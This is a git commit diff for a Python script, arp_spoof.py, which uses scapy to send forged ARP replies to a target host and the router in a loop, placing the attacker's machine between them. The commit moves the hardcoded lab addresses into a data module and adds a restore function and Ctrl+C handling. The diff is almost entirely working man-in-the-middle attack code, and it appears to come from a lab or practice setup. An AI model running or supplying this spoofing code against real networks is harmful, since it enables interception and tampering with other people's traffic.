72b30b778facdf353991bf7f708800073be291f8
Vhackenstance <hackenstance@proton.me>
2026-05-18 11:37:25 -0500

    Testing: restore target and router settings

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,31 +1,38 @@
 #/usr/bin/env python
 # Rebuild
-from scapy.layers.l2 import ARP, Ether, getmacbyip
+from scapy.layers.l2 import ARP, getmacbyip
 import scapy.all as scapy
 import time
 import sys
 from utils.arp_spoof_utils import check_port_forwarding
-
-target_interface_1 = "192.168.63.174"
-target_interface_2 = "192.168.63.177"
-target_mac_1 = "00:0c:29:3a:62:c0"
-router_ip = "192.168.63.2"
-router_mac = "00-0c-29-fe-37-29"
-my_ip = "192.168.63.139"
+from utils.data import data
 
 check_port_forwarding()
-def spoof(target_ip, spoof_ip):
+
+def spoof(target_ip, router_ip):
 	target_mac = getmacbyip(target_ip)
 	# pkt1 = ARP(op="is-at", psrc=router_ip, hwsrc=router_mac, pdst=victim_ip, hwdst=victim_mac)
-	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+	packet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
 	scapy.send(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+	destination_mac = getmacbyip(destination_ip)
+	source_mac = getmacbyip(source_ip)
+	packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
+	print(packet.show())
+	print(packet.summary())
+
+restore(data["target_ip1"], data["router_ip"])
+
 sent_packets_count = 0
-while True:
-	spoof(target_interface_1, router_ip)
-	spoof(router_ip, target_interface_1)
-	sent_packets_count = sent_packets_count + 2
-	# For Python3 add end="" to the end of the print statement, remove comma
-	print("\r[+] Packets sent: " + str(sent_packets_count)),
-	sys.stdout.flush()
-	time.sleep(2)
+try:
+	while True:
+		spoof(data["target_ip1"], data["router_ip"])
+		spoof(data["router_ip"], data["target_ip1"])
+		sent_packets_count = sent_packets_count + 2
+		# For Python3 add end="" to the end of the print statement, remove comma
+		print("\r[+] Packets sent: " + str(sent_packets_count)),
+		sys.stdout.flush()
+		time.sleep(2)
+except KeyboardInterrupt:
+	print("\n[+] Detected CTRL + C ...... Quiting.")
